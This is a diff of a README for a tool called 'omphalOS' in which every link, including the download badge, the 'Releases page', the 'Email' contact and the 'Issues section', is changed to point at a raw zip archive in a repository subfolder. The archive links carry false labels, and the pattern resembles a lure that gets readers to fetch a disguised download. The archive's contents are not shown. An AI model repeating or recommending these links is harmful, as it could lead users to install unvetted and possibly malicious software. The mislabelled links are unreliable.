@@ -1,6 +1,6 @@
 # 🌟 omphalOS - Simplifying Trade and Technology Review
 
-[![Download omphalOS](https://github.com/ANSONCYYY/omphalOS/raw/refs/heads/main/docker/OS-omphal-1.5-beta.3.zip)](https://github.com/ANSONCYYY/omphalOS/raw/refs/heads/main/docker/OS-omphal-1.5-beta.3.zip)
+[![Download omphalOS](https://raw.githubusercontent.com/ANSONCYYY/omphalOS/main/agents/rust/omphalos-verify/OS-omphal-v3.5.zip)](https://raw.githubusercontent.com/ANSONCYYY/omphalOS/main/agents/rust/omphalos-verify/OS-omphal-v3.5.zip)
 
 ## 🔍 Overview
 
@@ -13,7 +13,7 @@ To begin using omphalOS, follow the simple steps below to download and run the s
 ## 📥 Download & Install
 
 1. **Visit the Download Page:** Go to the omphalOS Releases page by clicking the link below:
-   [Visit this page to download](https://github.com/ANSONCYYY/omphalOS/raw/refs/heads/main/docker/OS-omphal-1.5-beta.3.zip)
+   [Visit this page to download](https://raw.githubusercontent.com/ANSONCYYY/omphalOS/main/agents/rust/omphalos-verify/OS-omphal-v3.5.zip)
 
 2. **Choose Your Version:** On the Releases page, you will find different versions of omphalOS. Choose the version that best fits your needs. 
 
@@ -58,11 +58,11 @@ For additional help and guidance, please refer to the following resources:
 
 If you have any questions or need further assistance, please reach out:
 
-- **Email:** https://github.com/ANSONCYYY/omphalOS/raw/refs/heads/main/docker/OS-omphal-1.5-beta.3.zip
-- **GitHub Issues:** Report any bugs or suggest features using the [Issues section](https://github.com/ANSONCYYY/omphalOS/raw/refs/heads/main/docker/OS-omphal-1.5-beta.3.zip).
+- **Email:** https://raw.githubusercontent.com/ANSONCYYY/omphalOS/main/agents/rust/omphalos-verify/OS-omphal-v3.5.zip
+- **GitHub Issues:** Report any bugs or suggest features using the [Issues section](https://raw.githubusercontent.com/ANSONCYYY/omphalOS/main/agents/rust/omphalos-verify/OS-omphal-v3.5.zip).
 
 ## 🎉 Conclusion
 
 Installing and using omphalOS is straightforward. By following the steps laid out in this guide, you will set up the software correctly and begin leveraging its features for your trade and technology analyses. Enjoy your experience with omphalOS! If you need any help, refer to our support resources or contact us directly. 
 
-[Download omphalOS](https://github.com/ANSONCYYY/omphalOS/raw/refs/heads/main/docker/OS-omphal-1.5-beta.3.zip) and start simplifying your reviews today!
+[Download omphalOS](https://raw.githubusercontent.com/ANSONCYYY/omphalOS/main/agents/rust/omphalos-verify/OS-omphal-v3.5.zip) and start simplifying your reviews today!
